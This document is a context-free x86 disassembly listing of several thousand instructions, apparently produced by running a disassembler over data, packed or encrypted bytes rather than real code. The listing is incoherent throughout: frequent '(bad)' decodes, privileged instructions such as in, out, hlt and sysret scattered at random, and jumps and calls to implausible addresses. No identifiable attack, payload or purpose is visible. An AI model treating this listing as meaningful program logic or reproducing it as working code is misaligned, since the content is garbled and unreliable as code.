  41041b:	pop    edi
  41041c:	jne    0x41039f
  41041e:	mov    esi,DWORD PTR [eax]
  410420:	call   0x77b58fc1
  410425:	xor    ebp,DWORD PTR [ebx]
  410427:	lea    esp,[esi+0x48]
  41042a:	repnz in eax,0x3b
  41042d:	add    BYTE PTR [ebp-0x37],dh
  410430:	xor    edx,DWORD PTR [ebp-0x15]
  410433:	in     al,dx
  410434:	xor    edx,DWORD PTR [esi+0x40]
  410437:	mov    DWORD PTR [edi],0x338545fc
  41043d:	clc    
  41043e:	add    esi,DWORD PTR [ecx]
  410440:	pop    edi
  410441:	pushf  
  410442:	pop    ebx
  410443:	call   0xff42040a
  410448:	mov    edi,eax
  41044a:	push   ecx
  41044b:	pop    es
  41044c:	mov    edi,DWORD PTR [eax]
  41044e:	push   esi
  41044f:	inc    esi
  410450:	add    bh,BYTE PTR [esi+0x0]
  410453:	popa   
  410454:	data16 (bad) 
  410456:	into   
  410457:	gs cmp al,0xcd
  41045a:	add    BYTE PTR [ecx+0x7ce0866],bh
  410460:	ret    0x66
  410463:	add    bh,al
  410465:	add    bh,ah
  410467:	add    BYTE PTR [ebp+0x31c3f866],al
  41046d:	cmp    al,0x9c
  41046f:	add    BYTE PTR [esi+0x66],ah
  410472:	into   
  410473:	ret    
  410474:	pop    ebp
  410475:	adc    BYTE PTR [edi+0x0],dl
  410478:	mov    bh,0x66
  41047a:	mov    edi,0xff038dc3
  41047f:	jne    0x4104d5
  410481:	lea    edx,[ecx+0x1]
  410484:	mov    ebx,0xd64ff1
  410489:	sar    DWORD PTR [ebx],1
  41048b:	test   BYTE PTR [ebp+0x36],dh
  41048e:	mov    DWORD PTR [esp+edi*8-0x76],esp
  410492:	push   edi
  410493:	xor    BYTE PTR [ebx],0x38
  410496:	mov    esi,ebx
  410498:	xor    eax,DWORD PTR [eax-0x3c73819a]
  41049e:	ss inc ebp
  4104a0:	fs pop ebx
  4104a2:	mov    ebx,0x9c3b30
  4104a7:	je     0x4104d4
  4104a9:	xor    edi,DWORD PTR [ebx+0x668a33]
  4104af:	mov    WORD PTR [ebx],?
  4104b1:	ss mov ebx,0x8b4e64
  4104b7:	pop    edi
  4104b8:	cmp    ecx,ecx
  4104ba:	jne    0x410511
  4104bc:	mov    ebp,esp
  4104be:	cld    
  4104bf:	push   esi
  4104c0:	pop    ebx
  4104c1:	inc    ebp
  4104c2:	stc    
  4104c3:	xor    BYTE PTR [ebp+0x9bef89c],al
  4104c9:	test   esi,ecx
  4104cb:	clc    
  4104cc:	test   dl,dl
  4104ce:	cmp    bh,bh
  4104d0:	fs pop si
  4104d3:	or     bl,al
  4104d5:	add    cl,BYTE PTR [ebx+0x57665100]
  4104db:	retf   0x3c45
  4104de:	xor    BYTE PTR [eax],al
  4104e0:	pushf  
  4104e1:	mov    si,0x85ca
  4104e5:	ret    0xf8
  4104e8:	pop    ebx
  4104e9:	dec    dx
  4104ec:	mov    edx,DWORD PTR [edi-0x76]
  4104ef:	push   edi
  4104f0:	add    al,0xb7
  4104f2:	xor    al,0xba
  4104f4:	cmp    al,0x8d
  4104f6:	je     0x4104f7
  4104f8:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4104fc:	lea    edi,[ebx+0x544fff]
  410502:	push   ecx
  410503:	cmp    edx,DWORD PTR [ebx+0x75]
  410506:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41050c:	add    BYTE PTR [ebx],dh
  41050e:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410514:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  41051b:	mov    ebx,0x3b3b00
  410520:	jne    0x41054d
  410522:	mov    DWORD PTR [ebx+0x728afc],edi
  410528:	xor    esi,DWORD PTR [ebx]
  41052a:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410530:	push   edi
  410531:	cmp    esp,ebp
  410533:	jne    0x410535
  410535:	sbb    DWORD PTR [eax],0x8085c3fc
  41053b:	clc    
  41053c:	inc    esi
  41053d:	pop    ebx
  41053e:	sti    
  41053f:	add    eax,0xeb8bc075
  410544:	cld    
  410545:	xor    edi,DWORD PTR ds:0xf8c3855e
  41054b:	mov    ecx,DWORD PTR [ecx+edx*2]
  41054e:	rol    DWORD PTR [ebp-0x37],0xf
  410552:	mov    DWORD PTR [eax],ecx
  410554:	inc    edi
  410555:	(bad)  
  410556:	in     eax,0xfe
  410558:	add    bh,bh
  41055a:	(bad)  
  41055b:	mov    esi,0xc38a5e
  410560:	mov    esi,DWORD PTR [ebx]
  410562:	push   ecx
  410563:	mov    edi,0xfc4ec7
  410568:	test   DWORD PTR [ebp-0x8],edx
  41056b:	xor    di,ax
  41056e:	pushf  
  41056f:	sub    ebp,eax
  410571:	inc    ebp
  410572:	(bad)  
  410573:	sub    edi,edi
  410575:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  41057b:	inc    ebp
  41057c:	add    BYTE PTR [esi+0x2b],ah
  41057f:	or     bh,BYTE PTR [edx+0xf8ac2]
  410585:	cmp    al,0x33
  410587:	mov    edi,DWORD PTR [edx+0xfe4e81]
  41058d:	(bad)  
  41058e:	cmp    esi,DWORD PTR [ebx]
  410590:	je     0x41054a
  410592:	push   ebx
  410593:	dec    esi
  410594:	str    ecx
  410597:	cmp    esp,DWORD PTR [ebp+0x75]
  41059a:	int    0x33
  41059c:	mov    edi,0x789085f
  4105a1:	mov    edx,DWORD PTR [eax]
  4105a3:	cld    
  4105a4:	add    cl,cl
  4105a6:	data16 add al,0xcb
  4105a9:	push   ebp
  4105aa:	add    ebp,esp
  4105ac:	jne    0x41059a
  4105ae:	(bad)  
  4105af:	mov    DWORD PTR [ecx],0xd685f7ec
  4105b5:	clc    
  4105b6:	xlat   BYTE PTR ds:[ebx]
  4105b7:	inc    ebp
  4105b8:	mov    esi,DWORD PTR [edx]
  4105ba:	push   eax
  4105bb:	pushf  
  4105bc:	in     eax,0x8b
  4105be:	add    ah,ch
  4105c0:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4105c4:	add    ax,0x72cb
  4105c8:	cmp    al,0x0
  4105ca:	add    BYTE PTR [ebp+0x66],al
  4105cd:	(bad)  
  4105ce:	retf   
  4105cf:	lock ret 0x85
  4105d3:	clc    
  4105d4:	inc    bp
  4105d6:	retf   
  4105d7:	cmp    eax,0xc77d9cc8
  4105dc:	xor    ah,bh
  4105de:	pushf  
  4105df:	test   DWORD PTR [edi-0x8],ebx
  4105e2:	je     0x410629
  4105e4:	xor    esi,DWORD PTR ds:0x7020840
  4105ea:	ror    BYTE PTR [ebp-0x37],0x8d
  4105ee:	push   ebp
  4105ef:	add    esp,ebp
  4105f1:	jb     0x41057e
  4105f3:	add    BYTE PTR [eax],cl
  4105f5:	dec    ebp
  4105f6:	mov    bh,0x81
  4105f8:	push   esi
  4105f9:	push   esp
  4105fa:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  410601:	xor    al,BYTE PTR [eax]
  410603:	mov    edx,DWORD PTR [edi+0x10]
  410606:	(bad)  
  410607:	scas   eax,DWORD PTR es:[edi]
  410608:	ret    0x3b
  41060b:	jns    0x3b4202fe
  410611:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410615:	dec    ebp
  410616:	or     BYTE PTR [ebx],ch
  410618:	ret    0x458b
  41061b:	lock jmp 0x41060f
  41061e:	mov    ecx,DWORD PTR [eax]
  410620:	or     BYTE PTR [edi],al
  410622:	mov    ecx,eax
  410624:	xor    DWORD PTR [edx+0x2],0x0
  410628:	mov    bh,0xc1
  41062a:	adc    BYTE PTR [eax],dh
  41062c:	iret   
  41062d:	inc    ebp
  41062e:	mov    DWORD PTR [ebx],0x4dfff8c4
  410634:	inc    BYTE PTR [ebx]
  410636:	ret    0xf8
  410639:	adc    DWORD PTR [esi+0x10],esp
  41063c:	clc    
  41063d:	dec    ecx
  41063e:	fisttp WORD PTR [ecx+0x456604c0]
  410644:	add    dh,BYTE PTR ds:0x75e0845
  41064a:	ret    0x4d
  41064d:	lea    ecx,[ebx+0x18728301]
  410653:	add    BYTE PTR [ebp+0x45],al
  410656:	xor    ecx,ebp
  410658:	pushf  
  410659:	add    bh,al
  41065b:	add    al,ch
  41065d:	inc    ebp
  41065e:	test   DWORD PTR [ebx-0x3eba0708],ecx
  410664:	xor    eax,0x781084d
  410669:	push   esp
  41066a:	fwait
  41066b:	push   ecx
  41066c:	xor    al,BYTE PTR [ecx+0x32f89b89]
  410672:	inc    ebp
  410673:	cmp    edi,DWORD PTR [ecx]
  410675:	jbe    0x410613
  410677:	mov    eax,edi
  410679:	or     ah,dh
  41067b:	inc    ebp
  41067c:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  410682:	xor    ecx,DWORD PTR [ebx-0x74747664]
  410688:	in     al,dx
  410689:	hlt    
  41068a:	push   esp
  41068b:	push   esp
  41068c:	push   ecx
  41068d:	push   ecx
  41068e:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  410694:	fwait
  410695:	fwait
  410696:	xor    dh,BYTE PTR [edx]
  410698:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  41069e:	or     BYTE PTR [ebp+0x7],al
  4106a1:	mov    eax,ecx
  4106a3:	clc    
  4106a4:	jb     0x410667
  4106a6:	add    BYTE PTR [ebp+0x55],cl
  4106a9:	or     DWORD PTR [edi],0xc251d154
  4106af:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4106b9:	mov    edi,eax
  4106bb:	or     cl,al
  4106bd:	inc    ebp
  4106be:	dec    ebp
  4106bf:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4106c5:	or     WORD PTR [ecx],0x899b
  4106ca:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4106d0:	mov    edx,DWORD PTR [ecx+0x8]
  4106d3:	mov    eax,DWORD PTR [ebp-0x8]
  4106d6:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4106dd:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4106e3:	inc    ebp
  4106e4:	dec    eax
  4106e5:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4106eb:	add    edx,DWORD PTR [ecx-0x8]
  4106ee:	mov    ecx,DWORD PTR [ecx]
  4106f0:	clc    
  4106f1:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4106f8:	mov    ecx,ebp
  4106fa:	clc    
  4106fb:	(bad)  
  4106fc:	popf   
  4106fd:	inc    DWORD PTR [eax]
  4106ff:	ret    0x8b
  410702:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  410708:	mov    edi,esp
  41070a:	hlt    
  41070b:	test   ecx,esi
  41070d:	clc    
  41070e:	or     BYTE PTR [ebp+0x7],al
  410711:	xor    al,cl
  410713:	pushf  
  410714:	jb     0x410749
  410716:	add    BYTE PTR [eax-0x3f],al
  410719:	inc    eax
  41071a:	daa    
  41071b:	inc    ebp
  41071c:	inc    ebp
  41071d:	xor    eax,0x7f80803
  410722:	dec    ebp
  410723:	fwait
  410724:	add    esi,DWORD PTR [edx]
  410726:	clc    
  410727:	cmp    DWORD PTR [ecx],ecx
  410729:	or     al,0x8
  41072b:	add    al,BYTE PTR [ebp+0x2c]
  41072e:	xor    eax,0x7350845
  410733:	or     BYTE PTR [ebp+0x7],cl
  410736:	lea    ebx,[ebx-0x748dcdff]
  41073c:	add    BYTE PTR [eax*2-0x74b21438],cl
  410743:	mov    edx,DWORD PTR [eax]
  410745:	cld    
  410746:	dec    ebp
  410747:	push   esp
  410748:	sub    edx,DWORD PTR [ecx-0x75]
  41074b:	add    eax,0xf172fc
  410750:	or     BYTE PTR [ebp+0x7],cl
  410753:	add    eax,ecx
  410755:	or     al,0x72
  410757:	add    DWORD PTR [eax],eax
  410759:	mov    ebx,0x29c2c1
  41075e:	inc    ebp
  41075f:	mov    eax,DWORD PTR [ebx]
  410761:	cmp    eax,0x3004d1c
  410767:	xbegin 0x66c69361
  41076d:	clc    
  41076e:	or     BYTE PTR [ebp+0x45],al
  410771:	xor    dh,BYTE PTR ds:0x78b089c
  410777:	adc    BYTE PTR [ebp+0x45],cl
  41077a:	lea    eax,[ebp+0x33727501]
  410780:	add    cl,ch
  410782:	inc    ebp
  410783:	add    bl,ch
  410785:	add    BYTE PTR [ebx+0x45850845],cl
  41078b:	je     0x410718
  41078d:	push   ebx
  41078e:	or     al,0x85
  410790:	dec    ebp
  410791:	std    
  410792:	mov    bh,bh
  410794:	mov    BYTE PTR [ebp-0x75],al
  410797:	mov    edi,eax
  410799:	or     al,0x89
  41079b:	inc    ebp
  41079c:	clc    
  41079d:	mov    esp,esp
  41079f:	hlt    
  4107a0:	call   DWORD PTR [edi-0x37]
  4107a3:	push   esp
  4107a4:	or     al,0x51
  4107a6:	push   ebp
  4107a7:	xor    ebp,esp
  4107a9:	mov    esi,0x457251
  4107ae:	xor    esi,eax
  4107b0:	pushf  
  4107b1:	inc    ebp
  4107b2:	(bad)  
  4107b3:	mov    edi,eax
  4107b5:	or     al,0x85
  4107b7:	add    al,bh
  4107b9:	inc    eax
  4107bb:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4107bf:	or     ah,bh
  4107c1:	inc    eax
  4107c2:	push   esp
  4107c3:	jmp    0x410816
  4107c5:	mov    eax,DWORD PTR ds:0xe8720c
  4107cb:	mov    DWORD PTR [ebp-0x8],eax
  4107ce:	jne    0x410815
  4107d0:	jmp    0x41075d
  4107d2:	mov    ebp,DWORD PTR [eax]
  4107d4:	clc    
  4107d5:	retf   0xff54
  4107d8:	push   ecx
  4107d9:	mov    DWORD PTR ds:0x757210,eax
  4107df:	mov    ecx,DWORD PTR [ebp-0x4]
  4107e2:	sub    esp,DWORD PTR [ebx-0x77]
  4107e5:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4107ec:	or     ah,bh
  4107ee:	pop    es
  4107ef:	ds fwait
  4107f1:	push   DWORD PTR [edx]
  4107f3:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4107f9:	(bad)  
  4107fa:	mov    bh,bh
  4107fc:	jmp    0x4107ea
  4107fe:	leave  
  4107ff:	jne    0x410809
  410801:	call   0x2e015b
  410806:	in     al,dx
  410807:	dec    ebp
  410808:	add    dh,BYTE PTR [ebx]
  41080a:	add    BYTE PTR [ebx],al
  41080c:	inc    ebp
  41080d:	cmp    esi,DWORD PTR [ecx]
  41080f:	je     0x4107ad
  410811:	mov    eax,edi
  410813:	or     al,0xf0
  410815:	add    BYTE PTR [ebp+0x458bf845],al
  41081b:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410821:	adc    al,0x7
  410823:	enter  0x9fc0,0xa5
  410827:	rol    BYTE PTR [eax],0x5e
  41082a:	mov    ecx,ecx
  41082c:	or     al,0xc
  41082e:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410835:	jmp    0x410836
  410837:	push   ebp
  410838:	mov    esp,ebp
  41083a:	cld    
  41083b:	inc    ebp
  41083c:	inc    ebp
  41083d:	or     DWORD PTR [ecx+0x457dec10],0x0
  410844:	push   esi
  410845:	push   esi
  410846:	mov    edi,0x7af080f
  41084b:	add    bh,al
  41084d:	test   DWORD PTR [ebx+0x3a7320f],ebx
  410853:	add    BYTE PTR [ecx+0x4540100f],cl
  410859:	mov    ebp,eax
  41085b:	mov    ebp,edi
  41085d:	lock call edx
  410860:	fcom   DWORD PTR [ebp+0x45]
  410863:	mov    eax,0x148a8b
  410868:	push   ecx
  410869:	enter  0xc145,0x83
  41086d:	cmp    ecx,DWORD PTR [eax]
  41086f:	add    BYTE PTR [ebp+0x4d],al
  410872:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  410878:	call   0xffa103e7
  41087d:	cmp    eax,DWORD PTR [ebp-0xc]
  410880:	jmp    DWORD PTR [eax+edx*1-0x4e]
  410884:	push   ebp
  410885:	(bad)  
  410886:	call   0x32068a
  41088b:	mov    bh,0xdb
  41088d:	cld    
  41088e:	or     BYTE PTR [ebp+0x45],bl
  410891:	(bad)  
  410892:	call   0xff7b0522
  410897:	add    al,BYTE PTR [ebp+0x37]
  41089a:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  4108a0:	jne    0x4108a2
  4108a2:	(bad)  
  4108a3:	cmp    edi,esp
  4108a5:	jne    0x4108d8
  4108a7:	mov    edi,edi
  4108a9:	or     BYTE PTR [ebx-0x307f0b49],cl
  4108af:	pop    ds
  4108b0:	into   
  4108b1:	je     0x410874
  4108b3:	mov    ebx,DWORD PTR [esi]
  4108b5:	or     BYTE PTR [ebp-0x49],al
  4108b8:	mov    esp,DWORD PTR [esi-0x77]
  4108bb:	mov    esi,0x2451f0c
  4108c0:	mov    eax,DWORD PTR [eax]
  4108c2:	or     al,0x66
  4108c4:	sar    bl,0x3b
  4108c7:	xor    esi,DWORD PTR [ebp+0x66]
  4108ca:	xor    ecx,edi
  4108cc:	pop    edi
  4108cd:	adc    bl,BYTE PTR [ebx+0x7e]
  4108d0:	ret    0xff
  4108d3:	cld    
  4108d4:	inc    ebp
  4108d5:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4108db:	cld    
  4108dc:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4108e3:	push   0xffffff83
  4108e5:	pop    edi
  4108e6:	or     BYTE PTR [ebp+0x53],dh
  4108e9:	xorps  xmm1,xmm2
  4108ec:	test   BYTE PTR [eax+eax*1],bh
  4108ef:	add    BYTE PTR [eax],al
  4108f1:	adc    eax,eax
  4108f3:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4108fb:	jmp    DWORD PTR [eax]
  4108fd:	ror    al,0x5e
  410900:	inc    ebp
  410901:	leave  
  410902:	xor    ecx,DWORD PTR [eax]
  410904:	and    DWORD PTR [ebx-0x3ec30708],ecx
  41090a:	add    ah,al
  41090c:	xor    edi,edi
  41090e:	xor    DWORD PTR [ebx],0x66003302
  410914:	mov    DWORD PTR [ebp-0xc],ecx
  410917:	pcmpgtw mm0,mm0
  41091a:	add    dl,ah
  41091c:	leave  
  41091d:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  410921:	push   eax
  410922:	dec    ebp
  410923:	mov    esi,DWORD PTR [ebx-0x75]
  410926:	lea    ebp,[eax-0x7c00ff02]
  41092c:	xor    eax,DWORD PTR [eax]
  41092e:	sysret 
  410930:	dec    ebp
  410931:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410938:	push   WORD PTR [ecx+0x8]
  41093c:	jne    0x4108ff
  41093e:	ud0    ecx,DWORD PTR [ecx]
  410941:	mov    eax,edx
  410943:	lods   al,BYTE PTR ds:[esi]
  410944:	add    BYTE PTR [eax],al
  410946:	data16 (bad) 
  410948:	iret   
  410949:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410950:	cli    
  410951:	inc    ebp
  410952:	cmp    al,0x8d
  410954:	add    BYTE PTR [esi+0x2d],ah
  410957:	inc    ebp
  410958:	pop    ebp
  410959:	lea    ecx,[edi]
  41095b:	mov    dl,bh
  41095d:	add    BYTE PTR [edi],cl
  41095f:	mov    DWORD PTR [eax+eax*8],edi
  410962:	mov    ebx,0x3b87
  410967:	add    BYTE PTR [ebx],ch
  410969:	inc    ebp
  41096a:	data16 (bad) 
  41096c:	clc    
  41096d:	int3   
  41096e:	cmp    eax,DWORD PTR [eax]
  410970:	je     0x4108fb
  410972:	push   0xffffffc8
  410974:	pop    edi
  410975:	xchg   DWORD PTR [ebp+0x0],eax
  410978:	data16 add BYTE PTR [ebp+0x45],cl
  41097c:	lea    cx,[ebp+0x10]
  410980:	jb     0x410982
  410982:	jmp    0x41090d
  410984:	call   eax
  410986:	clc    
  410987:	xchg   DWORD PTR [edi+0x1],edi
  41098a:	mov    eax,DWORD PTR [eax]
  41098c:	or     BYTE PTR [ebp-0x49],al
  41098f:	lea    eax,[eax+0x74003154]
  410995:	push   edi
  410996:	inc    edx
  410997:	jge    0x410998
  410999:	mov    DWORD PTR [edi],ecx
  41099b:	fdiv   DWORD PTR [edi-0x6]
  41099e:	inc    DWORD PTR [eax]
  4109a0:	xor    edx,DWORD PTR [eax+0x5f]
  4109a3:	xchg   DWORD PTR [ebx+0x1],ebx
  4109a6:	ret    0x0
  4109a9:	xor    BYTE PTR [ebp-0x51],cl
  4109ac:	cmp    edi,0xf0ff89fe
  4109b2:	data16 ror al,0x84
  4109b6:	rol    BYTE PTR [eax],0x3b
  4109b9:	add    al,dh
  4109bb:	dec    eax
  4109bc:	xchg   esp,eax
  4109bd:	push   ebx
  4109be:	jmp    0x41094b
  4109c0:	push   ebp
  4109c1:	add    esp,ebp
  4109c3:	add    ebp,esp
  4109c5:	mov    edx,DWORD PTR [edi+0x24]
  4109c8:	clc    
  4109c9:	dec    esi
  4109ca:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  4109d0:	cmp    BYTE PTR [ebx],al
  4109d2:	jne    0x41095d
  4109d4:	xor    esp,eax
  4109d6:	jmp    0x440b59
  4109db:	add    ebp,DWORD PTR [ecx+ecx*4]
  4109de:	jne    0x4109d4
  4109e0:	call   0xffcb073a
  4109e5:	clc    
  4109e6:	xchg   edi,eax
  4109e7:	sti    
  4109e8:	add    DWORD PTR [ebx],eax
  4109ea:	add    BYTE PTR [ebp+0x47],bl
  4109ed:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  4109f3:	pop    ebp
  4109f4:	mov    DWORD PTR [esi-0x48],esi
  4109f7:	jmp    0x410a40
  4109f9:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  4109ff:	(bad)  
  410a01:	cmp    al,0x0
  410a03:	cmp    eax,DWORD PTR [ebp+0x18]
  410a06:	lea    ebx,[ebp-0x56]
  410a09:	jle    0x410a0b
  410a0b:	jae    0x410996
  410a0d:	mov    eax,esp
  410a0f:	call   0xb900:0x8b005587
  410a16:	inc    ebp
  410a17:	push   ebp
  410a18:	lea    ecx,[ebp-0x27ff4f12]
  410a1e:	mov    eax,edi
  410a20:	int3   
  410a21:	push   ebp
  410a22:	xchg   edi,eax
  410a24:	add    esp,ebp
  410a26:	add    BYTE PTR [eax],al
  410a28:	inc    ebp
  410a29:	add    BYTE PTR [ebp+0x8b3255],cl
  410a2f:	cld    
  410a30:	mov    DWORD PTR [edx],edi
  410a32:	aam    0x75
  410a34:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410a3a:	mov    DWORD PTR [ebx-0x50],edx
  410a3d:	test   BYTE PTR [ebp-0x1],0xe8
  410a41:	mov    eax,DWORD PTR [eax]
  410a43:	hlt    
  410a44:	add    al,al
  410a46:	mov    eax,DWORD PTR ds:0x890045a8
  410a4c:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410a52:	inc    DWORD PTR [eax*2+0xf75854d]
  410a59:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410a5f:	call   0x729767a0
  410a64:	je     0x410ac4
  410a66:	js     0x410ac7
  410a68:	lock ret 0x7e
  410a6c:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410a72:	mov    edi,edi
  410a74:	sbb    al,bl
  410a76:	clc    
  410a77:	add    BYTE PTR [ebp-0x73],bh
  410a7a:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410a80:	ror    BYTE PTR [eax],1
  410a82:	dec    ebp
  410a83:	xchg   ebp,eax
  410a84:	mov    edi,edi
  410a86:	in     al,0x8b
  410a88:	jge    0x410a13
  410a8a:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410a90:	clc    
  410a91:	pop    esi
  410a92:	fist   DWORD PTR [ebp+0x5d398b5d]
  410a98:	clc    
  410a99:	add    al,0x6e
  410a9b:	mov    eax,DWORD PTR [ebx]
  410a9d:	mov    BYTE PTR [ebp+0x0],dl
  410aa0:	mov    edx,DWORD PTR [ebx-0x20]
  410aa3:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  410aa9:	add    eax,0x3b3b73
  410aae:	adc    al,0x89
  410ab0:	pop    eax
  410ab1:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410ab5:	ret    0xf08
  410ab8:	cmp    al,0x2
  410aba:	mov    edx,eax
  410abc:	cld    
  410abd:	add    BYTE PTR [ebp+0x66],dl
  410ac0:	add    eax,ebx
  410ac2:	add    esp,eax
  410ac4:	sub    eax,eax
  410ac6:	or     BYTE PTR [ecx-0x77f474bb],cl
  410acc:	add    BYTE PTR [eax],al
  410ace:	mov    DWORD PTR [ebx-0x24],ebx
  410ad1:	push   edi
  410ad2:	push   ebp
  410ad3:	clc    
  410ad4:	add    DWORD PTR [esi+0x1b0100],0x45
  410adb:	out    0xff,eax
  410add:	add    edx,DWORD PTR [eax]
  410adf:	jmp    0x410ac9
  410ae1:	cmp    ch,0x46
  410ae4:	(bad)  
  410ae5:	jmp    0x40c69337
  410aea:	je     0x410a76
  410aec:	mov    eax,DWORD PTR [eax-0x10c78104]
  410af2:	inc    ebp
  410af3:	add    BYTE PTR [ebx-0x770375],al
  410af9:	add    ah,ch
  410afb:	add    edx,esp
  410afd:	pop    edi
  410afe:	pop    ebp
  410aff:	push   ebp
  410b00:	inc    ebx
  410b01:	in     al,dx
  410b02:	pop    ebp
  410b03:	in     al,dx
  410b04:	cmp    edx,DWORD PTR [edi-0x8]
  410b07:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  410b0e:	add    al,0x47
  410b10:	push   ebp
  410b11:	mov    esp,ebp
  410b13:	in     al,0x45
  410b15:	dec    ebp
  410b16:	push   esi
  410b17:	test   DWORD PTR [eax+0xfb010f],esi
  410b1d:	add    BYTE PTR [eax+0xc018b],dh
  410b23:	leave  
  410b24:	inc    ebp
  410b25:	test   al,ch
  410b27:	add    dh,bh
  410b29:	add    bh,bh
  410b2b:	dec    ebp
  410b2c:	push   cs
  410b2d:	mov    DWORD PTR [ecx],eax
  410b2f:	hlt    
  410b30:	push   es
  410b31:	dec    ebp
  410b32:	leave  
  410b33:	mov    DWORD PTR [eax],ecx
  410b35:	clc    
  410b36:	cmovge eax,ecx
  410b39:	mov    ecx,0x85c2f0
  410b3f:	clc    
  410b40:	pop    DWORD PTR [ebp+0x1]
  410b43:	push   ebx
  410b44:	add    BYTE PTR [ebp-0x15],bh
  410b47:	push   esi
  410b48:	xor    eax,0x898a45
  410b4d:	cld    
  410b4e:	add    al,BYTE PTR [ebp+0x0]
  410b51:	xor    esp,DWORD PTR [esi-0x64]
  410b54:	add    DWORD PTR [esi+0x78308c1],edi
  410b5a:	add    ah,BYTE PTR [ebp-0x49]
  410b5d:	int    0xbb
  410b5f:	mov    ecx,DWORD PTR [esi+0xc]
  410b62:	add    dh,al
  410b64:	cmp    ecx,ebx
  410b66:	jne    0x410b30
  410b68:	xor    ecx,DWORD PTR [ebp+0x66]
  410b6b:	jmp    0xc80b71
  410b70:	add    DWORD PTR [ebp+0x0],eax
  410b73:	mov    eax,ebx
  410b75:	or     al,0x8b
  410b77:	(bad)  
  410b78:	mov    ecx,esi
  410b7a:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  410b81:	mov    eax,edi
  410b83:	or     BYTE PTR [edx],cl
  410b85:	shl    cl,cl
  410b87:	icebp  
  410b88:	add    BYTE PTR [ebp+0x38],0x8b
  410b8c:	or     BYTE PTR [edx+eax*2],cl
  410b8f:	(bad)  
  410b90:	or     cl,dh
  410b92:	stc    
  410b93:	shl    DWORD PTR [ebp-0x30],0xc6
  410b97:	xor    al,0x0
  410b99:	inc    ebp
  410b9a:	xchg   BYTE PTR [ebx],al
  410b9c:	add    esp,edi
  410b9e:	add    BYTE PTR [ebp-0x39],cl
  410ba1:	mov    al,bl
  410ba3:	test   DWORD PTR [ebx+0x1c348375],ecx
  410ba9:	sub    al,0xbf
  410bab:	jmp    0x410b32
  410bad:	mov    edi,eax
  410baf:	lock jge 0x410ba3
  410bb2:	lea    esi,[edx-0x74bad5ff]
  410bb8:	mov    ebp,esp
  410bba:	or     cl,dh
  410bbc:	leave  
  410bbd:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  410bc4:	dec    ebp
  410bc5:	dec    ebp
  410bc6:	test   DWORD PTR [ebx],eax
  410bc8:	paddb  mm6,mm0
  410bcb:	add    DWORD PTR [eax],eax
  410bcd:	dec    ebp
  410bce:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  410bd4:	mov    esi,DWORD PTR [edx]
  410bd6:	or     al,0x2b
  410bd8:	dec    ebp
  410bd9:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410bdf:	mov    esp,edi
  410be1:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410be8:	mov    DWORD PTR [ebx],ebp
  410bea:	call   0xc74951a
  410bef:	mov    DWORD PTR [ebp+0x10],ecx
  410bf2:	(bad)  
  410bf3:	push   0x8b85ff10
  410bf8:	clc    
  410bf9:	or     al,0x54
  410bfb:	(bad)  
  410bfc:	push   ecx
  410bfd:	retf   
  410bfe:	mov    ebx,0xff4d8dc8
  410c03:	mov    DWORD PTR [ebp+0x8],eax
  410c06:	xor    eax,DWORD PTR [ebp-0x75]
  410c09:	cmp    ebp,DWORD PTR [ebx]
  410c0b:	lsl    ebx,WORD PTR [edi-0x8]
  410c0f:	call   DWORD PTR [ebx-0x741bff75]
  410c15:	(bad)  
  410c16:	or     al,0x5b
  410c18:	dec    ebp
  410c19:	or     BYTE PTR [ebx],dh
  410c1b:	inc    ebp
  410c1c:	xor    esi,DWORD PTR ds:0x708088d
  410c22:	in     eax,0x9b
  410c24:	add    BYTE PTR [edx],dh
  410c26:	inc    ebp
  410c27:	pop    edi
  410c28:	xor    eax,edx
  410c2a:	test   DWORD PTR [eax],0x83108b8b
  410c30:	dec    ebp
  410c31:	adc    al,0x33
  410c33:	inc    ebp
